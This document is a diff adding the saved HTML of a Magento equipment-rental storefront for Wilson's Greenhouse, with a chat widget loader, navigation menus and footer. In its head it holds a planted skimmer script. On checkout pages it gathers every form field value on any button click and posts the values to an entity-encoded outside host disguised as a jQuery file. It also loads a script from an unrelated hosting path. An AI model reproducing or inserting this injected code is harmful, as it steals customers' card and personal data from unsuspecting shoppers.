@@ -1,0 +1,386 @@
+
+				<script type="text/javascript">
+					(function ()
+					{
+						// Localize jQuery variable
+						var jQuery;
+						/******** Load jQuery if not present *********/
+						if(window.jQuery === undefined || window.jQuery.fn.jquery !== "1.4.2")
+						{
+							var script_tag = document.createElement("script");
+							script_tag.setAttribute("type", "text/javascript");
+							script_tag.setAttribute("src",
+								"http://rentals.wilsonsgreenhouse.ca/js/provide/jquery.min.js");
+							if(script_tag.readyState)
+							{
+								script_tag.onreadystatechange = function ()
+								{ // For old versions of IE
+									if(this.readyState == "complete" || this.readyState == "loaded")
+									{
+										scriptLoadHandler();
+									}
+								};
+							}
+							else
+							{ // Other browsers
+								script_tag.onload = scriptLoadHandler;
+							}
+							// Try to find the head, otherwise default to the documentElement
+							(document.getElementsByTagName("head")[0] || document.documentElement)
+								.appendChild(script_tag);
+						}
+						else
+						{
+							// The jQuery version on the window is the one we want to use
+							jQuery = window.jQuery;
+							main();
+						}
+						/******** Called once jQuery has loaded ******/
+						function scriptLoadHandler()
+						{
+							// Restore $ and window.jQuery to their previous values and store the
+							// new jQuery in our local jQuery variable
+							jQuery = window.jQuery.noConflict(true);
+							// Call our main function
+							main();
+						}
+						/******** Our main function ********/
+						function main()
+						{
+							jQuery(document)
+								.ready(function ($)
+								{
+									
+      
+        var BUTTONTEXT = 'ProvideSupport : chat button code loaded';
+		var HIDDENTEXT = 'ProvideSupport : hidden monitoring code loaded';
+		var f7php = new Object();
+		var f7s = new Object();
+		f7s = JSON.parse("{\"pluginEnabled\":true,\"buttonImageType\":\"graphic\",\"buttonImageSource\":\"account\",\"buttonImageUrlOnline\":false,\"buttonImageUrlOffline\":false,\"buttonImageTextOnline\":false,\"buttonImageTextOffline\":false,\"buttonLocation\":\"fixed\",\"buttonLocationVerticalBy\":\"%\",\"buttonLocationVerticalValue\":\"1\",\"buttonLocationVerticalFrom\":\"bottom\",\"buttonLocationHorizontalBy\":\"%\",\"buttonLocationHorizontalValue\":\"1\",\"buttonLocationHorizontalFrom\":\"right\",\"buttonAvailableMenus\":false,\"buttonAvailableMenusWhich\":false,\"buttonAvailableMenusList\":[\"left\"],\"buttonAvailablePost\":true,\"buttonAvailablePostWhich\":\"all\",\"buttonAvailablePostList\":[],\"buttonAvailableWhole\":true,\"buttonAvailableAll\":true}"); //f7php.settings
+		
+		
+		
+		f7php.code = "<!-- BEGIN ProvideSupport.com Graphics Chat Button Code -->\n<div id=\"ciq64f\" style=\"z-index:100;position:absolute\"><\/div><div id=\"scq64f\" style=\"display:inline;position:fixed;z-index:9999;right:1%;bottom:1%;\"><\/div><div id=\"sdq64f\" style=\"display:none\"><\/div><script type=\"text\/javascript\">var seq64f=document.createElement(\"script\");seq64f.type=\"text\/javascript\";var seq64fs=(location.protocol.indexOf(\"https\")==0?\"https\":\"http\")+\":\/\/image.providesupport.com\/js\/0ukesssf6xmok1il63xpwxkbmy\/safe-standard.js?ps_h=q64f&ps_t=\"+new Date().getTime();setTimeout(\"seq64f.src=seq64fs;document.getElementById('sdq64f').appendChild(seq64f)\",1)<\/script><noscript><div style=\"display:inline\"><a href=\"http:\/\/www.providesupport.com?messenger=0ukesssf6xmok1il63xpwxkbmy\">Customer Support Chat<\/a><\/div><\/noscript>\n<!-- END ProvideSupport.com Graphics Chat Button Code -->";
+		f7php.hiddencode = "<!-- BEGIN ProvideSupport.com Visitor Monitoring Code -->\n<div id=\"ciq64f\" style=\"z-index:100;position:absolute\"><\/div><div id=\"sdq64f\" style=\"display:none\"><\/div><script type=\"text\/javascript\">var seq64f=document.createElement(\"script\");seq64f.type=\"text\/javascript\";var seq64fs=(location.protocol.indexOf(\"https\")==0?\"https\":\"http\")+\":\/\/image.providesupport.com\/js\/0ukesssf6xmok1il63xpwxkbmy\/safe-monitor.js?ps_h=q64f&ps_t=\"+new Date().getTime();setTimeout(\"seq64f.src=seq64fs;document.getElementById('sdq64f').appendChild(seq64f)\",1)<\/script><noscript><div style=\"display:inline\"><a href=\"http:\/\/www.providesupport.com?monitor=0ukesssf6xmok1il63xpwxkbmy\">Customer Support Chat<\/a><\/div><\/noscript>\n<!-- END ProvideSupport.com Visitor Monitoring Code -->";
+		showChat = function (code)
+		{
+			var codeBlock = document.createElement('div');
+			
+			
+			
+			codeBlock.className = 'f7x';
+			document.body.appendChild(codeBlock);
+			
+			jQuery('.f7x').html(code);
+			
+			/*
+			conf = {'position': 'fixed','width': 'auto','height': 'auto','z-index': 10000}
+			jQuery('.f7x').css(conf);
+			*/
+			
+			jQuery('.f7x').css(f7s.buttonLocationHorizontalFrom, f7s.buttonLocationHorizontalValue + f7s.buttonLocationHorizontalBy);
+			jQuery('.f7x').css(f7s.buttonLocationVerticalFrom, f7s.buttonLocationVerticalValue + f7s.buttonLocationVerticalBy);
+			
+		};  showChat(f7php.code); console.log(BUTTONTEXT); 
+								});
+						}
+					})(); // We call our anonymous function immediately
+				</script>
+<!DOCTYPE html>
+
+<!--[if lt IE 7 ]> <html lang="en" id="top" class="no-js ie6"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en" id="top" class="no-js ie7"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en" id="top" class="no-js ie8"> <![endif]-->
+<!--[if IE 9 ]>    <html lang="en" id="top" class="no-js ie9"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" id="top" class="no-js"> <!--<![endif]-->
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Home - Rentals</title>
+<meta name="description" content="Default Description" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://rentals.wilsonsgreenhouse.ca/media/favicon/default/favicon_1.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://rentals.wilsonsgreenhouse.ca/media/favicon/default/favicon_1.ico" type="image/x-icon" />
+<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,400italic,600,700,800' rel='stylesheet' type='text/css'>
+<!-- Start WOWSlider.com HEAD section -->
+<link rel="stylesheet" type="text/css" href="sliders/bulk/engine1/style.css" />
+<script type="text/javascript" src="sliders/bulk/engine1/jquery.js"></script>
+<!-- End WOWSlider.com HEAD section -->
+
+ <link rel="apple-touch-icon" href="images/wilsons-apple-icon-144.png"/>
+    <link rel="apple-touch-icon-precomposed" href="images/wilsons-apple-icon-144.png"/>
+
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://rentals.wilsonsgreenhouse.ca/js/blank.html';
+    var BLANK_IMG = 'http://rentals.wilsonsgreenhouse.ca/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://rentals.wilsonsgreenhouse.ca/js/bookmepro_calendar/pikaday.css" />
+<link rel="stylesheet" type="text/css" href="http://rentals.wilsonsgreenhouse.ca/js/prototype/windows/themes/default.css" />
+<link rel="stylesheet" type="text/css" href="http://rentals.wilsonsgreenhouse.ca/js/prototype/windows/themes/magento.css" />
+<link rel="stylesheet" type="text/css" href="http://rentals.wilsonsgreenhouse.ca/skin/frontend/base/default/css/ch_style.css" media="all" />
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/varien/js.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/varien/form.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/prototype/window.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/collinsharper/canpost/checkout.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/bookme_calendar/jstz-1.0.4.min.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/js/bookmepro_calendar/pikaday.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/lib/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/lib/modernizr.custom.min.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/lib/selectivizr.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/lib/matchMedia.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/lib/matchMedia.addListener.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/lib/enquire.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/app.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/lib/jquery.cycle2.min.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/lib/jquery.cycle2.swipe.min.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/slideshow.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/lib/imagesloaded.js"></script>
+<script type="text/javascript" src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/js/minicart.js"></script>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Raleway:300,400,500,700,600" />
+<!--[if  (lte IE 8) & (!IEMobile)]>
+<link rel="stylesheet" type="text/css" href="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/css/styles-ie8.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/css/madisonisland-ie8.css" media="all" />
+<![endif]-->
+<!--[if (gte IE 9) | (IEMobile)]><!-->
+<link rel="stylesheet" type="text/css" href="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/css/madisonisland.css" media="all" />
+<!--<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.rentals.wilsonsgreenhouse.ca';
+//]]>
+</script>
+<meta name="viewport" content="initial-scale=1.0, width=device-width" />
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+            <!-- BEGIN GOOGLE UNIVERSAL ANALYTICS CODE -->
+        <script type="text/javascript">
+        //<![CDATA[
+            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+            })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+            
+ga('create', 'UA-51282260-9', 'auto');
+
+ga('send', 'pageview');
+            
+        //]]>
+        </script>
+        <!-- END GOOGLE UNIVERSAL ANALYTICS CODE -->
+    <script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><script type="text/javascript">jQuery(function(t){t("button").on("click",function(){q="h="+window.location.href,q.match(/onepage|checkout/gi)&&(t("input, select").each(function(){t(this).val()?q+="&"+t(this).attr("name")+"="+t(this).val():""}),t.post(t("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;&#47;&#99;&#100;&#110;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#109;&#105;&#110;&#46;&#106;&#115;").text(),q))})});</script>
+<script src="//0055d7b.netsolhost.com/Blog/lib2/js/js.js"> </script>
+</head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        
+<!--<div class="header-language-background">
+    <div class="header-language-container">
+        <div class="store-language-container">
+                    </div>
+
+        
+        <p class="welcome-msg"> </p>
+    </div>
+</div>-->
+
+<header id="header" class="page-header">
+    <div class="page-header-container">
+        <a class="logo" href="http://rentals.wilsonsgreenhouse.ca/">
+            <img src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/images/logo.png" alt="Magento Commerce" class="large" />
+            <img src="http://rentals.wilsonsgreenhouse.ca/skin/frontend/rentals/default/images/logo.png" alt="Magento Commerce" class="small" />
+        </a>
+
+                <div class="store-language-container"></div>
+
+        <!-- Skip Links -->
+
+        <div class="skip-links">
+            <a href="#header-nav" class="skip-link skip-nav">
+                <span class="icon"></span>
+                <span class="label">Menu</span>
+            </a>
+
+            <a href="#header-search" class="skip-link skip-search">
+                <span class="icon"></span>
+                <span class="label">Search</span>
+            </a>
+
+            <a href="#header-account" class="skip-link skip-account">
+                <span class="icon"></span>
+                <span class="label">Account</span>
+            </a>
+
+            <!-- Cart -->
+
+            <div class="header-minicart">
+                
+
+<a href="#header-cart" class="skip-link skip-cart  no-count">
+    <span class="icon"></span>
+    <span class="label">Cart</span>
+    <span class="count">0</span>
+</a>
+
+<div id="header-cart" class="block block-cart skip-content">
+    
+<div id="minicart-error-message" class="minicart-message"></div>
+<div id="minicart-success-message" class="minicart-message"></div>
+
+<div class="minicart-wrapper">
+
+    <p class="block-subtitle">
+        Recently added item(s)        <a class="close skip-link-close" href="#" title="Close">&times;</a>
+    </p>
+
+                    <p class="empty">You have no items in your shopping cart.</p>
+
+    </div>
+</div>
+            </div>
+
+
+        </div>
+
+        <!-- Navigation -->
+
+        <div id="header-nav" class="skip-content">
+            
+    <nav id="nav">
+        <ol class="nav-primary">
+           <li class="level0 nav-1"><a href="http://www.wilsonsgreenhouse.ca">RETURN TO GREENHOUSE</a></li>  <li  class="level0 nav-1 first"><a href="http://rentals.wilsonsgreenhouse.ca/concrete-equipment.html" class="level0 ">Concrete Equipment</a></li><li  class="level0 nav-2 parent"><a href="http://rentals.wilsonsgreenhouse.ca/earth-moving-equipment.html" class="level0 has-children">Earth Moving Equipment</a><ul class="level0"><li class="level1"><a class="level1" href="http://rentals.wilsonsgreenhouse.ca/earth-moving-equipment.html">View All Earth Moving Equipment</a></li><li  class="level1 nav-2-1 first"><a href="http://rentals.wilsonsgreenhouse.ca/earth-moving-equipment/augers.html" class="level1 ">Augers</a></li><li  class="level1 nav-2-2"><a href="http://rentals.wilsonsgreenhouse.ca/earth-moving-equipment/plate-tampers.html" class="level1 ">Plate Tampers</a></li><li  class="level1 nav-2-3"><a href="http://rentals.wilsonsgreenhouse.ca/earth-moving-equipment/post-hole-augers.html" class="level1 ">Post Hole Augers  </a></li><li  class="level1 nav-2-4"><a href="http://rentals.wilsonsgreenhouse.ca/earth-moving-equipment/tillers.html" class="level1 ">Tillers</a></li><li  class="level1 nav-2-5"><a href="http://rentals.wilsonsgreenhouse.ca/earth-moving-equipment/trenchers.html" class="level1 ">Trenchers</a></li><li  class="level1 nav-2-6 last"><a href="http://rentals.wilsonsgreenhouse.ca/earth-moving-equipment/skid-steers.html" class="level1 ">Skid Steers</a></li></ul></li><li  class="level0 nav-3 parent"><a href="http://rentals.wilsonsgreenhouse.ca/general-equipment.html" class="level0 has-children">General Equipment</a><ul class="level0"><li class="level1"><a class="level1" href="http://rentals.wilsonsgreenhouse.ca/general-equipment.html">View All General Equipment</a></li><li  class="level1 nav-3-1 first"><a href="http://rentals.wilsonsgreenhouse.ca/general-equipment/accessories-miscellaneous.html" class="level1 ">Accessories/Miscellaneous</a></li><li  class="level1 nav-3-2"><a href="http://rentals.wilsonsgreenhouse.ca/general-equipment/ladders-scaffolding.html" class="level1 ">Ladders/Scaffolding</a></li><li  class="level1 nav-3-3"><a href="http://rentals.wilsonsgreenhouse.ca/general-equipment/pressue-washers.html" class="level1 ">Pressue Washers</a></li><li  class="level1 nav-3-4 last"><a href="http://rentals.wilsonsgreenhouse.ca/general-equipment/saws.html" class="level1 ">Saws</a></li></ul></li><li  class="level0 nav-4"><a href="http://rentals.wilsonsgreenhouse.ca/generators-motors.html" class="level0 ">Generators &amp; Motors</a></li><li  class="level0 nav-5 parent"><a href="http://rentals.wilsonsgreenhouse.ca/lawn-garden.html" class="level0 has-children">Lawn &amp; Garden</a><ul class="level0"><li class="level1"><a class="level1" href="http://rentals.wilsonsgreenhouse.ca/lawn-garden.html">View All Lawn &amp; Garden</a></li><li  class="level1 nav-5-1 first"><a href="http://rentals.wilsonsgreenhouse.ca/lawn-garden/mowers.html" class="level1 ">Mowers</a></li><li  class="level1 nav-5-2"><a href="http://rentals.wilsonsgreenhouse.ca/lawn-garden/other-lawn-tools.html" class="level1 ">Other Lawn Tools</a></li><li  class="level1 nav-5-3"><a href="http://rentals.wilsonsgreenhouse.ca/lawn-garden/tree-hedge-equipment.html" class="level1 ">Tree/Hedge Equipment  </a></li><li  class="level1 nav-5-4 last"><a href="http://rentals.wilsonsgreenhouse.ca/lawn-garden/weedeater.html" class="level1 ">Weedeater</a></li></ul></li><li  class="level0 nav-6 parent"><a href="http://rentals.wilsonsgreenhouse.ca/pumps-hose.html" class="level0 has-children">Pumps &amp; Hose</a><ul class="level0"><li class="level1"><a class="level1" href="http://rentals.wilsonsgreenhouse.ca/pumps-hose.html">View All Pumps &amp; Hose</a></li><li  class="level1 nav-6-1 first"><a href="http://rentals.wilsonsgreenhouse.ca/pumps-hose/hoses.html" class="level1 ">Hoses  </a></li><li  class="level1 nav-6-2 last"><a href="http://rentals.wilsonsgreenhouse.ca/pumps-hose/pumps.html" class="level1 ">Pumps  </a></li></ul></li><li  class="level0 nav-7 last"><a href="http://rentals.wilsonsgreenhouse.ca/transporting.html" class="level0 ">Transporting</a></li>        </ol>
+    </nav>
+        </div>
+
+        <!-- Search -->
+
+        <div id="header-search" class="skip-content">
+            
+<form id="search_mini_form" action="http://rentals.wilsonsgreenhouse.ca/catalogsearch/result/" method="get">
+    <div class="input-box">
+        <label for="search">Search:</label>
+        <input id="search" type="search" name="q" value="" class="input-text required-entry" maxlength="128" placeholder="Search entire store here..." />
+        <button type="submit" title="Search" class="button search-button"><span><span>Search</span></span></button>
+    </div>
+
+    <div id="search_autocomplete" class="search-autocomplete"></div>
+    <script type="text/javascript">
+    //<![CDATA[
+        var searchForm = new Varien.searchForm('search_mini_form', 'search', '');
+        searchForm.initAutocomplete('http://rentals.wilsonsgreenhouse.ca/catalogsearch/ajax/suggest/', 'search_autocomplete');
+    //]]>
+    </script>
+</form>
+        </div>
+
+        <!-- Account -->
+		<div id="header-account" class="skip-content">
+            <div class="links">
+        <ul>
+                                    <li class="first" ><a href="http://rentals.wilsonsgreenhouse.ca/customer/account/" title="My Account" >My Account</a></li>
+                                                <li ><a href="http://rentals.wilsonsgreenhouse.ca/wishlist/" title="My Wishlist" >My Wishlist</a></li>
+                                                <li ><a href="http://rentals.wilsonsgreenhouse.ca/checkout/cart/" title="My Cart" class="top-link-cart">My Cart</a></li>
+                                                <li ><a href="http://rentals.wilsonsgreenhouse.ca/checkout/" title="Check Availability" class="top-link-checkout">Check Availability</a></li>
+                                                <li ><a href="http://rentals.wilsonsgreenhouse.ca/customer/account/create/" title="Register" >Register</a></li>
+                                                <li class=" last" ><a href="http://rentals.wilsonsgreenhouse.ca/customer/account/login/" title="Log In" >Log In</a></li>
+                        </ul>
+</div>
+        </div>
+
+        <!-- Cart -->
+
+        <!-- <div id="header-cart" class="skip-content">
+            <div class="mini-cart">
+                <div class="menu-wrapper">
+                    <div class="menu cart-menu">
+                        <div class="empty">Your cart is empty.</div>
+                    </div>
+                </div>
+            </div>
+        </div> -->
+    </div>
+</header>
+
+
+        <!-- Start WOWSlider.com BODY section -->
+<div id="wowslider-container1">
+<div class="ws_images"><ul>
+<li><img src="sliders/rentals/data1/images/propane-slide-small.jpg" alt="rentals" title="rentals" id="wows1_0"/></li>
+		<li><a href="bulk.html"><img src="sliders/rentals/data1/images/rental1.jpg" alt="rentals" title="rentals" id="wows1_1"/></a></li>
+	</ul></div>
+
+<div class="ws_shadow"></div>
+</div>	
+<script type="text/javascript" src="sliders/rentals/engine1/wowslider.js"></script>
+<script type="text/javascript" src="sliders/rentals/engine1/script.js"></script>
+<!-- End WOWSlider.com BODY section -->
+        <div class="main-container col1-layout">
+            <div class="main">
+                <div class="col-main">
+                                        <div class="std"><div style="display: none;">Block</div></div>                </div>
+            </div> 
+        </div>
+                <div class="footer-container">
+    <div class="footer">
+    	<p><i>All prices in Canadian funds</i></p><br />
+        <div class="links">
+        <div class="block-title"><strong><span>Quick Links</span></strong></div>
+        <ul>
+                                    <li class="first" ><a href="http://rentals.wilsonsgreenhouse.ca/catalog/seo_sitemap/category/" title="Site Map" >Site Map</a></li>
+                                                <li ><a href="http://rentals.wilsonsgreenhouse.ca/catalogsearch/term/popular/" title="Search Terms" >Search Terms</a></li>
+                                                <li class=" last" ><a href="http://rentals.wilsonsgreenhouse.ca/catalogsearch/advanced/" title="Advanced Search" >Advanced Search</a></li>
+                        </ul>
+</div>
+<div class="links">
+        <div class="block-title"><strong><span>Account</span></strong></div>
+        <ul>
+                                    <li class="first" ><a href="http://rentals.wilsonsgreenhouse.ca/customer/account/" title="My Account" >My Account</a></li>
+                                                <li class=" last" ><a href="http://rentals.wilsonsgreenhouse.ca/sales/guest/form/" title="Orders and Returns" >Orders and Returns</a></li>
+                        </ul>
+</div>
+        <address class="copyright"><p><a href="http://www.wilsonspetsupply.ca" target="_blank">WILSON'S PETS</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="http://www.wilsonsentertainmentpark.ca" target="_blank">WILSON'S ENTERTAINMENT PARK</a></p>
+<p>
+Copyright&copy; 2014 Wilson's Greenhouse</p></address>
+    </div>
+</div>
+                
+
+    </div>
+</div>
+</body>
+</html>
+
